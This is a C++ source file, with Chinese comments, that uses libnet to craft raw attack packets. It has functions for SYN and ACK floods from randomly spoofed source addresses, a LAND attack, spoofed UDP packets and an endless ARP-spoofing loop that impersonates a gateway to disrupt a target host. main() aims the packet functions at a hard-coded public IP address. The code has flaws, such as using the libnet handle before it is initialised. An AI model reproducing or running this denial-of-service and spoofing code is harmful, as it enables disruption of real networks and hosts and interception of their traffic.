//#ifndef TCP_DOS_SUPPORT
//#define TCP_DOS_SUPPORT

#include <libnet.h>
#include <string.h>
#include <string>
//#include <stdlib>
#include <iostream>
#include   <time.h>
#include <sstream> 

using namespace std;

string create_random_IP()
{
	srand((unsigned)time(0));  
	stringstream stream[4];
	string tmp;
	string d;
	
	for(int i=0;i<4;i++)
	{
		int p = rand()%256;
		stream[i] << p;
		stream[i] >> d;
		tmp.append(d);
		if(i<3)
		{
			tmp+=".";
		}

	}
	cout<<tmp.data()<<endl;
	return tmp;
}


int construct_SYN_TCP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */
    
    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* 初始化Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

#if 0
    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* 源端口 */
                (uint16_t)dst_port,      /* 目的端口 */
                8888,                    /* 序列号 */
                8889,                    /* 确认号 */
                TH_SYN,                   /* Control flags */
                14600,                    /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + payload_s, /* 长度 */
                payload,                    /* 负载内容 */
                payload_s,                /* 负载内容长度 */
                handle,                    /* libnet句柄 */
                0                        /* 新建包 */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
    return (0);

}

int construct_land_TCP(string dev,string dst_ip_s,int dst_port)
{

    string src_ip_s = dst_ip_s.data();

    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */
    
    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* 初始化Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

#if 0
    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)dst_port,       /* 源端口 */
                (uint16_t)dst_port,      /* 目的端口 */
                8888,                    /* 序列号 */
                8889,                    /* 确认号 */
                TH_SYN,                   /* Control flags */
                14600,                    /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + payload_s, /* 长度 */
                payload,                    /* 负载内容 */
                payload_s,                /* 负载内容长度 */
                handle,                    /* libnet句柄 */
                0                        /* 新建包 */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
    return (0);
}

int construct_ack_TCP(string dev,string dst_ip_s,int dst_port)
{
    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */
    
    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* 初始化Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

#if 0
    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* 源端口 */
                (uint16_t)dst_port,      /* 目的端口 */
                8888,                    /* 序列号 */
                8889,                    /* 确认号 */
                TH_ACK,                   /* Control flags */
                14600,                    /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + payload_s, /* 长度 */
                payload,                    /* 负载内容 */
                payload_s,                /* 负载内容长度 */
                handle,                    /* libnet句柄 */
                0                        /* 新建包 */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
    return (0);
}

int ARP_dec_between_two_hosts(string dev,string dst_ip_s,string src_ip_s,int dst_port)
{
    //dst_ip_s干扰的目标IP
    //src_ip_s冒充的网关IP
    libnet_t *handle;        /* Libnet句柄 */
    int packet_size;
    char *device = "eth0";    /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    u_int8_t *src_ip_str = "192.168.2.30";        /* 冒充的网关IP */
    u_int8_t *dst_ip_str = "192.168.2.170";        /* 干扰的目标IP */
    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11};/* 虚假的源MAC */
    u_int8_t dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c};/* 干扰的目标MAC */
    u_int32_t dst_ip, src_ip;                /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE];        /* 出错信息 */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* 构造arp协议块 */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */ 
                ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */ 
                6,                    /* 硬件地址长度 */ 
                4,                    /* IP地址长度 */ 
                ARPOP_REPLY,        /* 操作方式:ARP请求 */ 
                src_mac,                /* source MAC addr */ 
                (u_int8_t *)&src_ip,    /* src proto addr */ 
                dst_mac,                /* dst MAC addr */ 
                (u_int8_t *)&dst_ip,    /* dst IP addr */ 
                NULL,                /* no payload */ 
                0,                    /* payload length */ 
                handle,                /* libnet tag */ 
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* 构造一个以太网协议块
    You should only use this function when 
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        dst_mac,            /* 以太网目的地址 */
        src_mac,            /* 以太网源地址 */
        ETHERTYPE_ARP,    /* 以太网上层协议类型，此时为ARP请求 */
        NULL,            /* 负载，这里为空 */ 
        0,                /* 负载大小 */
        handle,            /* Libnet句柄 */
        0                /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_proto_tag == -1)    {
        printf("build eth_header failure\n");
        return (-4);
    };

    while(1) {
        packet_size = libnet_write(handle);        /* 死循环发送arp欺骗广播 */
        usleep(1000);
    };

    libnet_destroy(handle);                /* 释放句柄 */

    return (0);
}

int construct_UDP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));  


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */

    char device[] = "eth0"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "192.168.2.170"; /* 目的IP地址字符串 */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, udp_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_UDP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */

    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    /* 初始化Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) {
        printf("libnet_init failure\n");
        return (-1);
    };

    strncpy((char*)payload, "testfwfewfwfeqwefqefqfe", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

    u_short rand_src_port = (u_short)rand()%6553;

    u_short u_dst_port = (u_short)dst_port;

    udp_tag = libnet_build_udp(
                rand_src_port, /* 源端口 */
                u_dst_port, /* 目的端口 */
                LIBNET_UDP_H + payload_s, /* 长度 */
                0, /* 校验和,0为libnet自动计算 */
                payload, /* 负载内容 */
                payload_s, /* 负载内容长度 */
                handle, /* libnet句柄 */
                0 /* 新建包 */
    );
    if (udp_tag == -1) {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_UDP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };

    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };

    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/

    libnet_destroy(handle); /* 释放句柄 */

    return (0);
}

int send(string dev,string dst_ip_s)
{
    string src_ip_s = create_random_IP();
    libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */
    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */
    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* 初始化Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

#if 0
    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    tcp_tag = libnet_build_tcp(
                30,                    /* 源端口 */
                800,                    /* 目的端口 */
                8888,                    /* 序列号 */
                8889,                    /* 确认号 */
                TH_SYN,                   /* Control flags */
                14600,                    /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + payload_s, /* 长度 */
                payload,                    /* 负载内容 */
                payload_s,                /* 负载内容长度 */
                handle,                    /* libnet句柄 */
                0                        /* 新建包 */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
}

int main()
{
	string dev = "ens33";
	string dst_ip_s = "125.216.249.125";
	int port = 1234;
	construct_SYN_TCP(dev,dst_ip_s,port);
	//send(dev,dst_ip_s);
	construct_land_TCP(dev,dst_ip_s,port);
	construct_ack_TCP(dev,dst_ip_s,port);
	construct_UDP(dev,dst_ip_s,port);


libnet_t *handle; /* Libnet句柄 */
    int packet_size; /* 构造的数据包大小 */
    char device[]= "ens33"; /* 设备名字,也支持点十进制的IP地址,会自己找到匹配的设备 */
    char src_ip_str[] = "192.168.2.148"; /* 源IP地址字符串 */
    char dst_ip_str[] = "125.216.249.125"; /* 目的IP地址字符串 */
    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* 源MAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* 目的MAC */
    u_long dst_ip, src_ip; /* 网路序的目的IP和源IP */
    char error[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* 各层build函数返回值 */
    u_short proto = IPPROTO_TCP; /* 传输层协议 */
    u_char payload[255] = {0}; /* 承载数据的数组，初值为空 */
    u_long payload_s = 0; /* 承载数据的长度，初值为0 */
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(handle, dst_ip_str, LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(handle, src_ip_str, LIBNET_RESOLVE);
    /* 初始化Libnet */
    if ( (handle = libnet_init(LIBNET_LINK, device, error)) == NULL ) 
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "test", sizeof(payload)-1); /* 构造负载的内容 */
    payload_s = strlen((char*)payload); /* 计算负载内容的长度 */

#if 0
    /* 构建TCP的选项,通常在第一个TCP通信报文中设置MSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    tcp_tag = libnet_build_tcp(
                30331,                    /* 源端口 */
                30331,                    /* 目的端口 */
                8888,                    /* 序列号 */
                8889,                    /* 确认号 */
                TH_SYN,                   /* Control flags */
                14600,                    /* 窗口尺寸 */
                0,                        /* 校验和,0为自动计算 */
                0,                        /* 紧急指针 */
                LIBNET_TCP_H + payload_s, /* 长度 */
                payload,                    /* 负载内容 */
                payload_s,                /* 负载内容长度 */
                handle,                    /* libnet句柄 */
                0                        /* 新建包 */
    );

    if (tcp_tag == -1) 
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* 构造IP协议块，返回值是新生成的IP协议快的一个标记 */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IP协议块的总长,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,随机产生0~65535 */
        0, /* frag 片偏移 */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,随机产生0~255 */
        proto, /* 上层协议 */
        0, /* 校验和，此时为0，表示由Libnet自动计算 */
        src_ip, /* 源IP地址,网络序 */
        dst_ip, /* 目标IP地址,网络序 */
        NULL, /* 负载内容或为NULL */
        0, /* 负载内容的大小*/
        handle, /* Libnet句柄 */
        0 /* 协议块标记可修改或创建,0表示构造一个新的*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* 构造一个以太网协议块,只能用于LIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* 以太网目的地址 */
        src_mac, /* 以太网源地址 */
        ETHERTYPE_IP, /* 以太网上层协议类型，此时为IP类型 */
        NULL, /* 负载，这里为空 */ 
        0, /* 负载大小 */
        handle, /* Libnet句柄 */
        0 /* 协议块标记，0表示构造一个新的 */ 
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* 发送已经构造的数据包*/
    libnet_destroy(handle); /* 释放句柄 */
	return 0;
}

//#endif